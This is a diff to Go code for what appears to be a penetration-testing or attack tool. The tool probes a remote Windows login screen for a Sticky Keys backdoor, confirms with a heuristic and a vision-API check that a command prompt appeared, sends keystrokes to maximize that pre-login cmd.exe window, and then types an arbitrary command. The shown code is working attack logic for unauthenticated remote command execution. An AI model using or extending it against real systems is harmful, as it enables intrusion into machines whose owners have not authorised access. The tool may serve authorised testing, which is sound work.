@@ -89,15 +89,32 @@ func RunStickyKeysExec(ctx context.Context, target, command string, timeout time
 		return result
 	}
 
-	verdict, _, description := analyzeStickyKeysResponse(baseline, response, sess.Width(), sess.Height())
-	if verdict != "backdoor_likely" {
-		fmt.Fprintf(os.Stderr, "[!] No backdoor detected (%s: %s). Aborting.\n", verdict, description)
+	// Use dual-check analysis: heuristic first, then Vision API confirmation when available.
+	// This avoids false negatives from the heuristic alone (e.g. cmd.exe window not forming
+	// a dense enough rectangle for the fill-ratio check).
+	analysis := runStickyKeysAnalysis(ctx, baseline, response, sess.Width(), sess.Height(), apiKey)
+	if analysis.OverallVerdict == "clean" {
+		fmt.Fprintf(os.Stderr, "[!] No backdoor detected (heuristic: %s). Aborting.\n", analysis.HeuristicResult)
 		result.BackdoorDetected = false
 		return result
 	}
 
 	result.BackdoorDetected = true
-	fmt.Fprintf(os.Stderr, "[+] Backdoor detected! Command prompt appeared.\n")
+	fmt.Fprintf(os.Stderr, "[+] Backdoor detected (%s, confidence: %.0f%%).\n",
+		analysis.OverallVerdict, analysis.Confidence*100)
+	if analysis.VisionResult != "" {
+		fmt.Fprintf(os.Stderr, "[+] Vision confirmation: %s\n", analysis.VisionResult)
+	}
+
+	// Maximize the cmd.exe window (Alt+Space → X) for better output visibility
+	fmt.Fprintf(os.Stderr, "[*] Maximizing terminal window...\n")
+	if maxErr := maximizeWindow(sess); maxErr != nil {
+		// Non-fatal: proceed with the smaller window
+		fmt.Fprintf(os.Stderr, "[!] Could not maximize window: %v\n", maxErr)
+	} else {
+		time.Sleep(500 * time.Millisecond)
+		sess.WaitForFrame(1 * time.Second)
+	}
 
 	// Type the command
 	fmt.Fprintf(os.Stderr, "[*] Typing command: %s\n", command)
@@ -185,4 +202,45 @@ func encodePNG(rgba []byte, width, height uint32) ([]byte, error) {
 		return nil, encErr
 	}
 	return buf.Bytes(), nil
+}
+
+// Scancodes for window maximize sequence (PS/2 Set 1).
+const (
+	altScancode   = 0x38 // Left Alt
+	spaceScancode = 0x39 // Space
+	xScancode     = 0x2D // X key
+)
+
+// maximizeWindow sends Alt+Space then X to maximize the active window via the system menu.
+func maximizeWindow(sess *InteractiveSession) error {
+	// Alt+Space opens the system menu
+	if err := sess.SendKey(altScancode, true); err != nil {
+		return fmt.Errorf("alt press: %w", err)
+	}
+	time.Sleep(20 * time.Millisecond)
+	if err := sess.SendKey(spaceScancode, true); err != nil {
+		return fmt.Errorf("space press: %w", err)
+	}
+	time.Sleep(20 * time.Millisecond)
+	if err := sess.SendKey(spaceScancode, false); err != nil {
+		return fmt.Errorf("space release: %w", err)
+	}
+	time.Sleep(20 * time.Millisecond)
+	if err := sess.SendKey(altScancode, false); err != nil {
+		return fmt.Errorf("alt release: %w", err)
+	}
+
+	// Wait for system menu to appear
+	time.Sleep(500 * time.Millisecond)
+
+	// Press 'x' to select Maximize
+	if err := sess.SendKey(xScancode, true); err != nil {
+		return fmt.Errorf("x press: %w", err)
+	}
+	time.Sleep(20 * time.Millisecond)
+	if err := sess.SendKey(xScancode, false); err != nil {
+		return fmt.Errorf("x release: %w", err)
+	}
+
+	return nil
 }
